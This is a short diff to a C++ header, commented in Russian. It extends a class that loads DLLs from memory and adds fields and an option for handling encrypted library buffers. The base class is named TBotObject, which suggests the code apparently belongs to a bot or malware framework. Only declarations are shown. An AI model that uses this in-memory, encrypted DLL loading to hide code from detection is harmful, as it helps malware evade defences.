@@ -87,11 +87,19 @@ class TMemoryDLL : public TBotObject
 {
 private:
 	HMEMORYMODULE FHandle;
+	DWORD  FSize;
+	LPVOID FSourceBuffer;
 public:
-	TMemoryDLL(const void* DllBuf);
+	// параметр DuplicateBuffer касается только библиотек в шифрованном
+	// формате. Если указать true то расшифрованный буфер будет
+	// храниться на протяжении всей жизни класса
+	TMemoryDLL(const void* DllBuf, bool DuplicateBuffer = false);
 	~TMemoryDLL();
 
-    HMEMORYMODULE inline Handle() { return FHandle; }
+	DWORD         inline Size()           { return FSize; }       // Размер библиотеки
+	LPVOID        inline SourceBuffer()   { return FSourceBuffer; } // Указатель на исходный буфер DLL
+
+	HMEMORYMODULE inline Handle() { return FHandle; }
 	bool		  IsTrue() { return FHandle != NULL; } //true если dll инициализирована
 
 	LPVOID        GetProcAddress(const char*   Name);
